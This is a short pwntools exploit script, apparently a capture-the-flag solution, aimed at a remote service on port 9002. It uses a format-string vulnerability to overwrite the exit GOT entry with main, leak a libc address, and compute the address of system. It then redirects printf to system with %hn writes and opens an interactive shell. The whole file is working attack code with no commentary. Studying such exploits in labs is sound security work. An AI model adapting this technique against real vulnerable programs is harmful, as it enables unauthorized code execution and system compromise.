from pwn import *

exit=0x804a01c
printf= 0x804a010
main=0x0804851b

#s=process("./pwnable")
s=remote("stack.overflow.fail",9002)
print(s.recv(1024))
#pause()
payload="aa"+p32(exit)
payload+="%2$x"
payload+="%5$x"
payload+="%34053c"
payload+="%11$hn"
s.send(payload+"\n")
a=s.recv(1024)
print(hexdump(a))
libc=int(a[6:14],16)

print(hex(libc))
#system=libc-0x177800
system=libc-0x175c60
system_1=system&0xffff
system_2=system>>16
print(hex(system_1))
print(hex(system_2))
print(s.recv(1024))
payload2="aa"+p32(printf)+p32(printf+2)+"%"+str(system_1-10)+"c"+"%11$hn"+"%"+str(system_2-system_1)+"c"+"%12$hn"
s.send(payload2+"\n")
print(s.recv(1024))

s.send("sh\x00\n")
print(s.recv(1024))
s.interactive()
s.close()

